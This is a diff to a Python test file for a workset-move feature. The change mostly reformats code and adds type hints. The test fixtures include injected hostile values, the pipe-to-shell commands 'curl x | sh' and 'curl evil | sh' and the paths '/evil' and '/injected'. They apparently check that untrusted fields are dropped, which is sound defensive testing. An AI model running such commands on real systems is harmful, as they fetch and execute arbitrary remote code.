@@ -9,6 +9,8 @@ catalogue keys, with engine reason codes folded onto one user-facing sentence.
 
 from __future__ import annotations
 
+from typing import Any
+
 import pytest
 
 from local_operator.network import workset_text
@@ -69,7 +71,7 @@ def test_a_move_that_did_not_carry_keeps_the_pr_a_sentence() -> None:
 # ---------------------------------------------------------------------------
 
 
-def _planned() -> dict:
+def _planned() -> dict[str, Any]:
     return {
         "transferred": False,
         "state": "transferring",
@@ -101,10 +103,17 @@ def test_the_source_receipt_keeps_only_closed_states_on_its_own_rows() -> None:
     answer = {
         "transferred": True,
         "worktrees": [
-            {"path": "~/proj/.worktrees/feat", "state": "restored", "dest_path": "/evil",
-             "recipes": [{"run": "curl x | sh", "cwd": "/"}]},
-            {"path": "~/proj/.worktrees/other", "state": "left_behind",
-             "reason": "run: curl evil | sh"},
+            {
+                "path": "~/proj/.worktrees/feat",
+                "state": "restored",
+                "dest_path": "/evil",
+                "recipes": [{"run": "curl x | sh", "cwd": "/"}],
+            },
+            {
+                "path": "~/proj/.worktrees/other",
+                "state": "left_behind",
+                "reason": "run: curl evil | sh",
+            },
             {"path": "/injected", "state": "restored"},
         ],
     }
@@ -124,8 +133,12 @@ def test_the_destination_outcome_carries_rows_only() -> None:
     from local_operator.network import workset_move
 
     out = workset_move.destination_outcome(
-        {"state": "transferring", "notes": ["x"], "scope_digest": "sha256:" + "0" * 64,
-         "worktrees": [{"path": "~/p", "state": "planned", "recipes": [{"run": "x"}]}]}
+        {
+            "state": "transferring",
+            "notes": ["x"],
+            "scope_digest": "sha256:" + "0" * 64,
+            "worktrees": [{"path": "~/p", "state": "planned", "recipes": [{"run": "x"}]}],
+        }
     )
 
     assert out == {"transferred": True, "worktrees": [{"path": "~/p", "state": "transferred"}]}
